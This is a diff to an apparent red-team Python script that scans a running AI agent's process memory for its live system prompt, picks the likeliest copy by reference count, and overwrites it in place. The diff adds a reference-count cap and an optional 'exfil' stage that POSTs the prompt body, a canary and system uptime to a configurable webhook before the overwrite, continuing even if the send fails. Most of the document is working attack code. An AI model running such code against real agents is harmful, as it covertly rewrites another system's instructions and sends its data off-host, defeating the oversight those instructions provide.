@@ -28,13 +28,22 @@ Pipeline:
      stream buffers — consistently high ref count.
   4. Overwrite the top-ranked body in place.
 """
+import json
 import os
-import re
 import pathlib
+import re
 import struct
+import urllib.error
+import urllib.request
 
 
 USER_CANARY = b'USR-CANARY-7B3F9A2E1D0C4F6'
+
+# Optional webhook for before/after exfil. Empty string = disabled.
+# When set, we POST a JSON payload with body_before, body_after, prompt_ptr,
+# length, refs, canary, and PID1 uptime BEFORE Stage 4's write lands.
+# Failures are logged but don't block the mutation (fail-open).
+WEBHOOK_URL = ''
 
 MIN_PTR = 0x1000
 MAX_PTR = 0x0000_ffff_ffff_ffff
@@ -221,7 +230,18 @@ print('windows_checked=%d unique_prompts=%d excluded_user_prompts=%d' %
 
 
 # -------------------- stage 3: rank and select ----------------------------
-print('---STAGE 3: rank survivors by reference count ---')
+# Ranking heuristic: live system prompts are pointed at from many places
+# (Agent._system_prompt, _system_prompt_content[0]['text'], serialized
+# request JSON, stream buffers). That puts their ref-count in the 5..50
+# range on a typical Strands harness.
+#
+# Strings with refs > REF_CEILING are shared stdlib/interned infrastructure
+# — namedtuple docstrings (one ref per namedtuple subclass in the
+# process), repr templates, collections helpers. They aren't live agent
+# state and mutating them corrupts the runtime. Cap the ranking so they
+# can't win.
+REF_CEILING = 50
+print('---STAGE 3: rank survivors by reference count (refs<=%d) ---' % REF_CEILING)
 targets = set(found.keys())
 ref_counts = {p: 0 for p in targets}
 for lo, data in region_data.items():
@@ -234,7 +254,12 @@ for lo, data in region_data.items():
             ref_counts[p] += 1
         off += 8
 
-ranked = sorted(found.items(), key=lambda kv: -ref_counts[kv[0]])
+eligible = {p: lb for p, lb in found.items() if ref_counts[p] <= REF_CEILING}
+excluded_high_ref = len(found) - len(eligible)
+print('eligible_after_ref_ceiling=%d  excluded_high_ref=%d' %
+      (len(eligible), excluded_high_ref))
+
+ranked = sorted(eligible.items(), key=lambda kv: -ref_counts[kv[0]])
 for i, (p, (L, body)) in enumerate(ranked[:5]):
     preview = body[:120].decode('utf-8', errors='replace')
     print('  [%d] prompt_ptr=0x%x len=%d refs=%d' %
@@ -242,12 +267,51 @@ for i, (p, (L, body)) in enumerate(ranked[:5]):
     print('      body: %r' % preview)
 
 if not ranked:
-    print('ABORT: no sentence-shaped candidate survived the filter.')
+    print('ABORT: no candidate in ref-count range [1..%d] survived.' % REF_CEILING)
     raise SystemExit(1)
 
 target_ptr, (target_len, target_body) = ranked[0]
 print('SELECTED prompt_ptr=0x%x len=%d refs=%d' %
       (target_ptr, target_len, ref_counts[target_ptr]))
+
+
+# -------------------- stage 3.5: capture BEFORE + optional webhook exfil ---
+# We already have target_body in memory (read during stage 2); this block
+# prints it in full and — if WEBHOOK_URL is configured — POSTs a JSON
+# record off-host before the overwrite lands. Fail-open: webhook errors
+# do NOT block stage 4.
+print('---STAGE 3.5: before snapshot ---')
+before_preview = target_body.decode('utf-8', errors='replace')
+print('  BEFORE (%d bytes): %r' % (target_len, before_preview))
+
+try:
+    pid1_uptime = pathlib.Path('/proc/uptime').read_text().split()[0]
+except Exception:
+    pid1_uptime = None
+
+if WEBHOOK_URL:
+    payload_json = json.dumps({
+        'event': 'dw_mutate.pre_write',
+        'prompt_ptr': '0x%x' % target_ptr,
+        'length': target_len,
+        'refs': ref_counts[target_ptr],
+        'canary': USER_CANARY.decode(),
+        'pid1_uptime': pid1_uptime,
+        'body_before': before_preview,
+    }).encode()
+    req = urllib.request.Request(
+        WEBHOOK_URL, data=payload_json,
+        headers={'Content-Type': 'application/json'},
+        method='POST',
+    )
+    try:
+        with urllib.request.urlopen(req, timeout=5) as resp:
+            print('  WEBHOOK pre_write → %s (%d bytes)' %
+                  (resp.status, len(payload_json)))
+    except Exception as e:
+        print('  WEBHOOK pre_write FAILED (continuing): %s' % e)
+else:
+    print('  (webhook disabled; set WEBHOOK_URL to enable exfil)')
 
 
 # -------------------- stage 4: overwrite ----------------------------------
